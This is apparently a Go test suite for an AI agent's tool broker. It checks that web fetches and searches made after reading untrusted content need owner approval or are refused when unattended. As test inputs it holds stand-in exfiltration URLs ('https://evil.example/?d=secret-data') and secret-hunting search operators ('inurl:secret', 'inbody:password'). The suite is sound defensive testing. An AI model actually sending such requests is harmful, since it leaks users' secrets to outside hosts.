package toolbroker

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"testing"

	"github.com/anggasct/aura/internal/platform/approval"
	"github.com/anggasct/aura/internal/platform/durable"
	"github.com/anggasct/aura/internal/platform/fault"
	"github.com/anggasct/aura/internal/platform/principal"
	"github.com/anggasct/aura/internal/platform/tools"
	"github.com/anggasct/aura/internal/platform/turn"
)

type reliefHarness struct {
	*taintHarness
	promptsReceived []*ApprovalPrompt
	answer          bool
	reliefMetrics   []string
	grantMetrics    []string
}

func newReliefBroker(t *testing.T, limits TaintedLimits, reachable func(string) bool, access AccessPolicy) *reliefHarness {
	t.Helper()
	rh := &reliefHarness{
		taintHarness: &taintHarness{calls: map[string]int{}},
		answer:       true,
	}
	adapter := func(name string) Adapter {
		return func(context.Context, *ToolRequest, approval.Constraints) (ToolResult, error) {
			rh.calls[name]++
			return ToolResult{Output: json.RawMessage(`{"ok":true}`)}, nil
		}
	}
	adapters := map[string]Adapter{}
	for _, name := range []string{"read_file", "list_dir", "web_fetch", "web_search", "exec", "write_file"} {
		adapters[name+"@v1"] = adapter(name)
	}
	broker, err := newFixtureBrokerOrErr(t, &Options{
		HostCapabilities: []string{"public-web", "provider-search", "workspace-read", "workspace-write", "exec-linux"},
		Effects:          newBrokerEffectExecutor(t),
		Adapters:         adapters,
		ApprovalDecider: func(_ context.Context, prompt *ApprovalPrompt) (bool, error) {
			rh.prompts++
			rh.reasons = append(rh.reasons, prompt.ReasonCode)
			copied := *prompt
			rh.promptsReceived = append(rh.promptsReceived, &copied)
			return rh.answer, nil
		},
		Access:            access,
		ApprovalReachable: reachable,
		Tainted:           limits,
		ObserveTaintRelief: func(_ context.Context, toolName, relief, outcome string) {
			rh.reliefMetrics = append(rh.reliefMetrics, toolName+":"+relief+":"+outcome)
		},
		ObserveTaintedTrustGrant: func(_ context.Context, outcome string) {
			rh.grantMetrics = append(rh.grantMetrics, outcome)
		},
	})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	for name, relief := range map[string]*tools.SinkRelief{
		"web_fetch@v1":  {Kind: tools.SinkReliefLinkProvenance, Argument: "url"},
		"web_search@v1": {Kind: tools.SinkReliefBoundedQuery, Argument: "query", MaxBytes: 256},
	} {
		broker.definitions[name].SinkRelief = relief
	}
	broker.RegisterSecret(secretToken)
	rh.broker = broker
	return rh
}

func (rh *reliefHarness) execRequest(req *ToolRequest) (ToolResult, error) {
	rh.seq++
	if req.RequestID == "" {
		req.RequestID = fmt.Sprintf("req-%d", rh.seq)
	}
	if req.IdempotencyKey == "" {
		req.IdempotencyKey = fmt.Sprintf("key-%d", rh.seq)
	}
	if req.EventSequence == 0 {
		req.EventSequence = uint64(rh.seq)
	}
	return rh.broker.Execute(context.Background(), req)
}

func fetchRequest(rawURL string, prov tools.LinkProvenance, count int) *ToolRequest {
	req := classifiedRequest("web_fetch", fmt.Sprintf(`{"url":%q}`, rawURL), principal.ClassOwner, "public-web")
	req.Tainted = true
	req.TaintMark = turn.TaintMark{Source: turn.TaintSourceToolResult, Detail: "web_fetch example.com"}
	req.TaintSource = req.TaintMark.Label()
	req.LinkProvenance = prov
	req.FetchCount = count
	return req
}

func searchRequest(query string, count int) *ToolRequest {
	req := classifiedRequest("web_search", fmt.Sprintf(`{"query":%q}`, query), principal.ClassOwner, "provider-search")
	req.Tainted = true
	req.TaintMark = turn.TaintMark{Source: turn.TaintSourceToolResult, Detail: "web_fetch example.com"}
	req.TaintSource = req.TaintMark.Label()
	req.QueryCount = count
	return req
}

func TestTaintedFetchOfAnOwnerGivenURLRunsWithoutACard(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Fetches: 2}, always, nil)
	for i := range 2 {
		if _, err := rh.execRequest(fetchRequest(fmt.Sprintf("https://example.com/page/%d", i), tools.LinkProvenanceOwnerMessage, i)); err != nil {
			t.Fatalf("fetch %d: %v", i, err)
		}
	}
	if rh.prompts != 0 || rh.calls["web_fetch"] != 2 {
		t.Fatalf("prompts = %d calls = %d, want 0 prompts and 2 fetches", rh.prompts, rh.calls["web_fetch"])
	}
	if _, err := rh.execRequest(fetchRequest("https://example.com/page/2", tools.LinkProvenanceOwnerMessage, 2)); err != nil {
		t.Fatalf("fetch past cap: %v", err)
	}
	if rh.prompts != 1 {
		t.Errorf("fetch past cap prompted %d times, want 1", rh.prompts)
	}
}

func TestTaintedFetchOfAModelWrittenURLAsks(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Fetches: 5}, always, nil)
	if _, err := rh.execRequest(fetchRequest("https://evil.example/?d=secret-data", tools.LinkProvenanceNone, 0)); err != nil {
		t.Fatalf("model-written fetch: %v", err)
	}
	if rh.prompts != 1 || rh.reasons[0] != approval.ReasonUntrustedInput {
		t.Errorf("prompts = %d reasons = %v, want 1 untrusted_input card", rh.prompts, rh.reasons)
	}
	if rh.promptsReceived[0].TaintSource != "a web_fetch result from example.com" {
		t.Errorf("TaintSource = %q, want taint source label", rh.promptsReceived[0].TaintSource)
	}
}

func TestNoReliefForURLsCarryingSecrets(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Fetches: 5, Queries: 5}, always, nil)
	longURL := "https://example.com/" + strings.Repeat("a", 251-len("https://example.com/"))
	cases := []struct {
		name string
		req  *ToolRequest
	}{
		{"secret in owner url", fetchRequest("https://example.com/?k="+secretToken, tools.LinkProvenanceOwnerMessage, 0)},
		{"userinfo in owner url", fetchRequest("https://user:pass@example.com/p", tools.LinkProvenanceOwnerMessage, 0)},
		{"url over 250 bytes", fetchRequest(longURL, tools.LinkProvenanceOwnerMessage, 0)},
		{"secret in fetched record url", func() *ToolRequest {
			r := fetchRequest("https://example.com/?k="+secretToken, tools.LinkProvenanceFetched, 0)
			r.SessionRecord = json.RawMessage(`{"body":"cached"}`)
			return r
		}()},
		{"secret in search query", searchRequest("find "+secretToken, 0)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			before := rh.prompts
			if _, err := rh.execRequest(tc.req); err != nil {
				t.Fatalf("Execute: %v", err)
			}
			if rh.prompts != before+1 {
				t.Errorf("prompts = %d, want 1 card (no relief)", rh.prompts-before)
			}
		})
	}
}

func TestWebReliefIsOwnerOnly(t *testing.T) {
	access := teamAccess()
	access.ceilings[principal.ClassTrusted] = []string{"web_fetch", "web_search"}
	access.ceilings[principal.ClassPublic] = []string{"web_fetch", "web_search"}
	rh := newReliefBroker(t, TaintedLimits{Fetches: 5, Queries: 5}, always, access)

	trustedFetch := fetchRequest("https://example.com/doc", tools.LinkProvenanceOwnerMessage, 0)
	trustedFetch.PrincipalClass = principal.ClassTrusted
	if _, err := rh.execRequest(trustedFetch); err != nil {
		t.Fatalf("trusted fetch: %v", err)
	}
	if rh.prompts != 1 {
		t.Errorf("trusted fetch prompted %d times, want 1 (no relief)", rh.prompts)
	}

	trustedSearch := searchRequest("plain query", 0)
	trustedSearch.PrincipalClass = principal.ClassTrusted
	if _, err := rh.execRequest(trustedSearch); err != nil {
		t.Fatalf("trusted search: %v", err)
	}
	if rh.prompts != 2 {
		t.Errorf("trusted search prompted %d times, want 1 more (no relief)", rh.prompts)
	}

	publicFetch := fetchRequest("https://example.com/doc", tools.LinkProvenanceOwnerMessage, 0)
	publicFetch.PrincipalClass = principal.ClassPublic
	if _, err := rh.execRequest(publicFetch); !fault.HasCode(err, ResultUntrustedInputNoApprover) {
		t.Errorf("public fetch = %v, want %s", err, ResultUntrustedInputNoApprover)
	}

	publicSearch := searchRequest("plain query", 0)
	publicSearch.PrincipalClass = principal.ClassPublic
	if _, err := rh.execRequest(publicSearch); !fault.HasCode(err, ResultUntrustedInputNoApprover) {
		t.Errorf("public search = %v, want %s", err, ResultUntrustedInputNoApprover)
	}
}

func TestBatchCardShowsTheExactQueryAndURLs(t *testing.T) {
	t.Run("shows limit, queries, and punycode urls up to 20 with no standing grant", func(t *testing.T) {
		rh := newReliefBroker(t, TaintedLimits{Fetches: 5}, always, nil)
		urls := make([]string, 0, 22)
		urls = append(urls, "https://bücher.example/1")
		for i := 2; i <= 22; i++ {
			urls = append(urls, fmt.Sprintf("https://e.co/%d", i))
		}
		req := fetchRequest("https://bücher.example/1", tools.LinkProvenanceSearchResult, 1)
		req.TurnID = "turn-batch-1"
		req.ResultBatch = &tools.ResultBatch{
			CallID:  "search-1",
			Queries: []string{"first query", "second query"},
			URLs:    urls,
		}
		if _, err := rh.execRequest(req); err != nil {
			t.Fatalf("batch fetch: %v", err)
		}
		if len(rh.promptsReceived) != 1 {
			t.Fatalf("prompts = %d, want 1", len(rh.promptsReceived))
		}
		p := rh.promptsReceived[0]
		if p.ReasonCode != approval.ReasonUntrustedInput || p.StandingGrantAllowed {
			t.Errorf("prompt reason=%q standing=%v, want untrusted_input and no standing", p.ReasonCode, p.StandingGrantAllowed)
		}
		if p.TaintSource != "a web_fetch result from example.com" {
			t.Errorf("TaintSource = %q", p.TaintSource)
		}
		for _, want := range []string{
			"Read up to 4 of these search results?",
			"query: first query",
			"query: second query",
			"url: https://xn--bcher-kva.example/1",
			"url: https://e.co/20",
		} {
			if !strings.Contains(p.Arguments, want) {
				t.Errorf("batch card lacks %q:\n%s", want, p.Arguments)
			}
		}
		if strings.Contains(p.Arguments, "https://e.co/21") {
			t.Errorf("batch card included URL past 20:\n%s", p.Arguments)
		}
		if strings.Index(p.Arguments, "url: https://xn--bcher-kva.example/1") > strings.Index(p.Arguments, "url: https://e.co/2") {
			t.Errorf("batch card did not preserve search/result URL order:\n%s", p.Arguments)
		}
	})

	t.Run("refuses with approval_display_too_large when batch card does not fit", func(t *testing.T) {
		rh := newReliefBroker(t, TaintedLimits{Fetches: 5}, always, nil)
		longURLs := make([]string, 0, 15)
		for i := range 15 {
			longURLs = append(longURLs, fmt.Sprintf("https://example.com/%02d/%s", i, strings.Repeat("p", 90)))
		}
		req := fetchRequest(longURLs[0], tools.LinkProvenanceSearchResult, 0)
		req.TurnID = "turn-batch-large"
		req.ResultBatch = &tools.ResultBatch{CallID: "s1", Queries: []string{"big"}, URLs: longURLs}
		if _, err := rh.execRequest(req); !fault.HasCode(err, ResultApprovalDisplayTooLarge) {
			t.Fatalf("err = %v, want %s", err, ResultApprovalDisplayTooLarge)
		}
		if rh.prompts != 0 || rh.calls["web_fetch"] != 0 {
			t.Errorf("prompts=%d calls=%d, want 0", rh.prompts, rh.calls["web_fetch"])
		}
	})

	t.Run("rejection refuses the batch and later search result calls in the turn", func(t *testing.T) {
		rh := newReliefBroker(t, TaintedLimits{Fetches: 5}, always, nil)
		rh.answer = false
		batch := &tools.ResultBatch{CallID: "s1", Queries: []string{"news"}, URLs: []string{"https://example.com/a", "https://example.com/b"}}
		req1 := fetchRequest("https://example.com/a", tools.LinkProvenanceSearchResult, 0)
		req1.TurnID = "turn-batch-reject"
		req1.ResultBatch = batch
		if _, err := rh.execRequest(req1); !fault.HasCode(err, ResultApprovalRequired) {
			t.Fatalf("first rejected call = %v, want %s", err, ResultApprovalRequired)
		}
		req2 := fetchRequest("https://example.com/b", tools.LinkProvenanceSearchResult, 0)
		req2.TurnID = "turn-batch-reject"
		req2.ResultBatch = batch
		if _, err := rh.execRequest(req2); !fault.HasCode(err, ResultApprovalRequired) {
			t.Fatalf("second call after rejection = %v, want %s", err, ResultApprovalRequired)
		}
		if rh.prompts != 1 || rh.calls["web_fetch"] != 0 {
			t.Errorf("prompts=%d calls=%d, want 1 prompt and 0 fetches", rh.prompts, rh.calls["web_fetch"])
		}
	})

	t.Run("rejection refuses later search result calls even at or past the fetch cap", func(t *testing.T) {
		rh := newReliefBroker(t, TaintedLimits{Fetches: 1}, always, nil)
		rh.answer = false
		batch := &tools.ResultBatch{CallID: "s1", Queries: []string{"news"}, URLs: []string{"https://example.com/a", "https://example.com/b"}}
		req1 := fetchRequest("https://example.com/a", tools.LinkProvenanceSearchResult, 0)
		req1.TurnID = "turn-batch-reject-cap"
		req1.ResultBatch = batch
		if _, err := rh.execRequest(req1); !fault.HasCode(err, ResultApprovalRequired) {
			t.Fatalf("first rejected call = %v, want %s", err, ResultApprovalRequired)
		}
		req2 := fetchRequest("https://example.com/b", tools.LinkProvenanceSearchResult, 1)
		req2.TurnID = "turn-batch-reject-cap"
		req2.ResultBatch = batch
		if _, err := rh.execRequest(req2); !fault.HasCode(err, ResultApprovalRequired) {
			t.Fatalf("second call at cap after rejection = %v, want %s", err, ResultApprovalRequired)
		}
		if rh.prompts != 1 || rh.calls["web_fetch"] != 0 {
			t.Errorf("prompts=%d calls=%d, want 1 prompt and 0 fetches", rh.prompts, rh.calls["web_fetch"])
		}
	})

	t.Run("durable replay of rejected batch refuses later calls at cap on a fresh broker", func(t *testing.T) {
		hosted := startHostedRuntime(t)
		seedSession(t, hosted.db)
		batch := &tools.ResultBatch{CallID: "s1", Queries: []string{"news"}, URLs: []string{"https://example.com/a", "https://example.com/b"}}
		makeBroker := func() *reliefHarness {
			rh := newReliefBroker(t, TaintedLimits{Fetches: 1}, always, nil)
			rh.answer = false
			return rh
		}
		firstBroker := makeBroker()
		replayBroker := makeBroker()
		var firstErr, secondErr error
		hosted.run(t, func(ctx context.Context, inv durable.Invocation) error {
			req1 := fetchRequest("https://example.com/a", tools.LinkProvenanceSearchResult, 0)
			req1.TurnID = "turn-durable-reject"
			req1.RequestID = "req-1"
			req1.IdempotencyKey = "key-1"
			req1.ResultBatch = batch
			_, firstErr = firstBroker.broker.Execute(inTurn(ctx, inv), req1)

			_, _ = replayBroker.broker.Execute(inTurn(ctx, inv), req1)
			req2 := fetchRequest("https://example.com/b", tools.LinkProvenanceSearchResult, 1)
			req2.TurnID = "turn-durable-reject"
			req2.RequestID = "req-2"
			req2.IdempotencyKey = "key-2"
			req2.ResultBatch = batch
			_, secondErr = replayBroker.broker.Execute(inTurn(ctx, inv), req2)
			return nil
		})
		if !fault.HasCode(firstErr, ResultApprovalRequired) || !fault.HasCode(secondErr, ResultApprovalRequired) {
			t.Fatalf("firstErr=%v secondErr=%v, want %s for both", firstErr, secondErr, ResultApprovalRequired)
		}
		if firstBroker.prompts != 1 || replayBroker.prompts != 0 {
			t.Errorf("firstBroker.prompts=%d replayBroker.prompts=%d, want 1 and 0", firstBroker.prompts, replayBroker.prompts)
		}
	})
}

func TestUnattendedTaintedTurnFollowsNoResultLinks(t *testing.T) {
	cases := []struct {
		name       string
		origin     turn.Origin
		unattended bool
	}{
		{"explicit unattended flag", turn.OriginTerminal, true},
		{"schedule origin without flag", turn.OriginSchedule, false},
		{"http origin without flag", turn.OriginHTTP, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rh := newReliefBroker(t, TaintedLimits{Fetches: 5}, always, nil)
			req := fetchRequest("https://example.com/result", tools.LinkProvenanceSearchResult, 0)
			req.Origin = tc.origin
			req.Unattended = tc.unattended
			req.ResultBatch = &tools.ResultBatch{CallID: "s1", Queries: []string{"q"}, URLs: []string{"https://example.com/result"}}
			if _, err := rh.execRequest(req); !fault.HasCode(err, ResultUntrustedInputNoApprover) {
				t.Fatalf("err = %v, want %s", err, ResultUntrustedInputNoApprover)
			}
			if rh.prompts != 0 || rh.calls["web_fetch"] != 0 {
				t.Errorf("prompts=%d calls=%d, want 0", rh.prompts, rh.calls["web_fetch"])
			}
			wantMetric := "web_fetch:search_batch:unattended"
			found := false
			for _, m := range rh.reliefMetrics {
				if m == wantMetric {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("reliefMetrics = %v, want %q", rh.reliefMetrics, wantMetric)
			}
		})
	}
}

func TestUnattendedTaintedTurnSearchAsksNoQueryRelief(t *testing.T) {
	cases := []struct {
		name       string
		origin     turn.Origin
		unattended bool
	}{
		{"explicit unattended flag", turn.OriginTerminal, true},
		{"http origin without flag", turn.OriginHTTP, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rh := newReliefBroker(t, TaintedLimits{Queries: 5}, always, nil)
			req := searchRequest("weather forecast", 0)
			req.Origin = tc.origin
			req.Unattended = tc.unattended
			if _, err := rh.execRequest(req); !fault.HasCode(err, ResultUntrustedInputNoApprover) {
				t.Fatalf("err = %v, want %s", err, ResultUntrustedInputNoApprover)
			}
			if rh.prompts != 0 || rh.calls["web_search"] != 0 {
				t.Errorf("prompts=%d calls=%d, want 0", rh.prompts, rh.calls["web_search"])
			}
			wantMetric := "web_search:bounded_query:unattended"
			found := false
			for _, m := range rh.reliefMetrics {
				if m == wantMetric {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("reliefMetrics = %v, want %q", rh.reliefMetrics, wantMetric)
			}
		})
	}
	rh := newReliefBroker(t, TaintedLimits{Queries: 5}, always, nil)
	cleanJob := searchRequest("morning briefing", 0)
	cleanJob.Origin = turn.OriginSchedule
	if _, err := rh.execRequest(cleanJob); err != nil {
		t.Fatalf("unattended clean job search = %v, want relieved", err)
	}
	if rh.calls["web_search"] != 1 || rh.prompts != 0 {
		t.Errorf("calls=%d prompts=%d, want 1 and 0", rh.calls["web_search"], rh.prompts)
	}
	taintedJob := searchRequest("weather forecast", 1)
	taintedJob.Origin = turn.OriginSchedule
	taintedJob.TaintMark = turn.TaintMark{Source: turn.TaintSourceScheduleOrigin, Detail: "job-1"}
	taintedJob.TaintSource = taintedJob.TaintMark.Label()
	before := rh.calls["web_search"]
	if _, err := rh.execRequest(taintedJob); !fault.HasCode(err, ResultUntrustedInputNoApprover) {
		t.Fatalf("tainted job search = %v, want %s", err, ResultUntrustedInputNoApprover)
	}
	if rh.calls["web_search"] != before {
		t.Errorf("tainted job search reached the adapter %d times, want 0", rh.calls["web_search"]-before)
	}
}

func TestTaintedFetchOfAModelWrittenURLIsRefusedUnattended(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Fetches: 5}, always, nil)
	req := fetchRequest("https://evil.example/leak", tools.LinkProvenanceNone, 0)
	req.Unattended = true
	if _, err := rh.execRequest(req); !fault.HasCode(err, ResultUntrustedInputNoApprover) {
		t.Fatalf("err = %v, want %s", err, ResultUntrustedInputNoApprover)
	}
	ownerReq := fetchRequest("https://owner.example/ok", tools.LinkProvenanceOwnerMessage, 0)
	ownerReq.Unattended = true
	if _, err := rh.execRequest(ownerReq); err != nil {
		t.Fatalf("unattended clean job owner_message fetch = %v, want relief", err)
	}
}

func TestTaintedJobGetsNoFetchRelief(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Fetches: 5}, always, nil)
	mark := turn.TaintMark{Source: turn.TaintSourceScheduleOrigin, Detail: "job-1"}

	ownerReq := fetchRequest("https://owner.example/ok", tools.LinkProvenanceOwnerMessage, 0)
	ownerReq.Unattended = true
	ownerReq.TaintMark = mark
	ownerReq.TaintSource = mark.Label()
	if _, err := rh.execRequest(ownerReq); !fault.HasCode(err, ResultUntrustedInputNoApprover) {
		t.Fatalf("tainted job owner_message fetch = %v, want %s", err, ResultUntrustedInputNoApprover)
	}

	batchReq := fetchRequest("https://example.com/r", tools.LinkProvenanceSearchResult, 0)
	batchReq.TaintMark = mark
	batchReq.TaintSource = mark.Label()
	batchReq.ResultBatch = &tools.ResultBatch{CallID: "s1", Queries: []string{"q"}, URLs: []string{"https://example.com/r"}}
	if _, err := rh.execRequest(batchReq); err != nil {
		t.Fatalf("attended tainted job batch fetch: %v", err)
	}
	if rh.prompts != 1 || strings.Contains(rh.promptsReceived[0].Arguments, "Read up to") {
		t.Errorf("tainted job got batch card instead of per-call card: %+v", rh.promptsReceived)
	}

	recordReq := fetchRequest("https://example.com/cached", tools.LinkProvenanceFetched, 0)
	recordReq.Unattended = true
	recordReq.TaintMark = mark
	recordReq.TaintSource = mark.Label()
	recordReq.SessionRecord = json.RawMessage(`{"url":"https://example.com/cached","body":"saved"}`)
	callsBefore := rh.calls["web_fetch"]
	res, err := rh.execRequest(recordReq)
	if err != nil {
		t.Fatalf("tainted job fetched record = %v, want served from session record", err)
	}
	if rh.calls["web_fetch"] != callsBefore || !strings.Contains(string(res.Output), `"from_session_record":true`) {
		t.Errorf("calls=%d output=%s, want no adapter call and from_session_record:true", rh.calls["web_fetch"]-callsBefore, res.Output)
	}
}

func TestTaintedJobGetsNoSearchRelief(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Queries: 5}, always, nil)
	mark := turn.TaintMark{Source: turn.TaintSourceScheduleOrigin, Detail: "job-1"}
	req := searchRequest("weather forecast", 0)
	req.Unattended = true
	req.TaintMark = mark
	req.TaintSource = mark.Label()
	if _, err := rh.execRequest(req); !fault.HasCode(err, ResultUntrustedInputNoApprover) {
		t.Fatalf("tainted job search = %v, want %s", err, ResultUntrustedInputNoApprover)
	}
	if rh.calls["web_search"] != 0 || rh.prompts != 0 {
		t.Errorf("calls=%d prompts=%d, want 0", rh.calls["web_search"], rh.prompts)
	}
}

func TestTaintedSearchQueriesAreBudgeted(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Queries: 2}, always, nil)
	for i := range 2 {
		if _, err := rh.execRequest(searchRequest(fmt.Sprintf("go release notes %d", i), i)); err != nil {
			t.Fatalf("search %d: %v", i, err)
		}
	}
	if rh.prompts != 0 || rh.calls["web_search"] != 2 {
		t.Fatalf("prompts=%d calls=%d, want 0 and 2", rh.prompts, rh.calls["web_search"])
	}
	if _, err := rh.execRequest(searchRequest("third query", 2)); err != nil {
		t.Fatalf("search past cap: %v", err)
	}
	if rh.prompts != 1 {
		t.Errorf("search past cap prompted %d times, want 1", rh.prompts)
	}
	unattendedClean := searchRequest("clean scheduled search", 0)
	unattendedClean.Origin = turn.OriginSchedule
	unattendedClean.Unattended = true
	if _, err := rh.execRequest(unattendedClean); err != nil {
		t.Fatalf("unattended clean job search = %v, want relieved", err)
	}
	for _, urlQuery := range []string{"check https://evil.example", "open www.evil.example", "HTTP://EVIL.EXAMPLE"} {
		before := rh.prompts
		if _, err := rh.execRequest(searchRequest(urlQuery, 0)); err != nil {
			t.Fatalf("url query %q: %v", urlQuery, err)
		}
		if rh.prompts != before+1 {
			t.Errorf("url query %q was relieved without a card", urlQuery)
		}
	}
}

func TestTaintedLongSearchQueryAsks(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Queries: 5}, always, nil)
	if _, err := rh.execRequest(searchRequest(strings.Repeat("a", 256), 0)); err != nil {
		t.Fatalf("256-byte query: %v", err)
	}
	if rh.prompts != 0 {
		t.Fatalf("256-byte query prompted %d times, want 0", rh.prompts)
	}
	if _, err := rh.execRequest(searchRequest(strings.Repeat("a", 257), 1)); err != nil {
		t.Fatalf("257-byte query: %v", err)
	}
	if rh.prompts != 1 {
		t.Errorf("257-byte query prompted %d times, want 1", rh.prompts)
	}
}

func TestSearchOperatorQueriesAsk(t *testing.T) {
	rh := newReliefBroker(t, TaintedLimits{Queries: 20}, always, nil)
	operators := []string{
		"site:example.com",
		"foo INURL:secret",
		"intitle:notes",
		"a intext:token",
		"allinurl:a b",
		"ALLINTITLE:x",
		"allintext:y",
		"link:example.com",
		"related:example.com",
		"cache:example.com",
		"filetype:pdf report",
		"ext:txt keys",
		"inbody:password",
		"-domain:evil.com",
	}
	for _, query := range operators {
		before := rh.prompts
		if _, err := rh.execRequest(searchRequest(query, 0)); err != nil {
			t.Fatalf("query %q: %v", query, err)
		}
		if rh.prompts != before+1 {
			t.Errorf("operator query %q was relieved without a card", query)
		}
	}
}

func TestTaintedGrantDeclarationIsRequiredForCards(t *testing.T) {
	declared := operationStub{name: "aura_stub_declared", risk: tools.RiskTrustGrant, previewed: true, taintedGrant: tools.TaintedGrantLabels}
	undeclared := operationStub{name: "aura_stub_undeclared", risk: tools.RiskTrustGrant, previewed: true}
	rig := newOperationRig(t, openOperationDatabase(t), &operationOptions{reachable: true}, declared, undeclared)

	undeclaredReq := operationRequest(undeclared.name, "x")
	undeclaredReq.Tainted = true
	undeclaredReq.TrustGrantOrdinal = 1
	if got := outcomeOf(rig.broker.Execute(t.Context(), undeclaredReq)); got.class != ResultUntrustedInputTrustGrant {
		t.Fatalf("undeclared tainted trust grant = %+v, want %s", got, ResultUntrustedInputTrustGrant)
	}
	if len(rig.decider.asked()) != 0 || rig.previewed.Load() != 0 {
		t.Fatalf("undeclared tainted trust grant prompted %d times and previewed %d times, want 0", len(rig.decider.asked()), rig.previewed.Load())
	}

	declaredReq := operationRequest(declared.name, "x")
	declaredReq.Tainted = true
	declaredReq.TrustGrantOrdinal = 1
	declaredReq.TaintMark = turn.TaintMark{Source: turn.TaintSourceRelayedInput, Detail: "telegram forward"}
	declaredReq.TaintSource = declaredReq.TaintMark.Label()
	if got := outcomeOf(rig.broker.Execute(t.Context(), declaredReq)); got.class != ResultOK {
		t.Fatalf("declared tainted trust grant = %+v, want ok", got)
	}
	prompts := rig.decider.asked()
	if len(prompts) != 1 || prompts[0].ReasonCode != approval.ReasonUntrustedTrustGrant || prompts[0].TaintSource != "a forwarded or quoted message" {
		t.Errorf("prompts = %+v, want warning card with taint source", prompts)
	}

	badDef := tools.Definition{
		Name: "aura_bad_grant", Version: tools.Version, Operation: "bad.grant", Risk: tools.RiskChange, TaintedGrant: tools.TaintedGrantInert,
		Validator: func(raw json.RawMessage) (json.RawMessage, error) { return raw, nil },
	}
	_ = badDef.ApplyOperationFlags()
	rule := DefaultRule(&badDef)
	if err := rig.broker.RegisterTool(&badDef, func(context.Context, *ToolRequest, approval.Constraints) (ToolResult, error) {
		return ToolResult{}, nil
	}, &rule); err == nil {
		t.Error("RegisterTool accepted TaintedGrant on a non-trust_grant definition")
	}
}
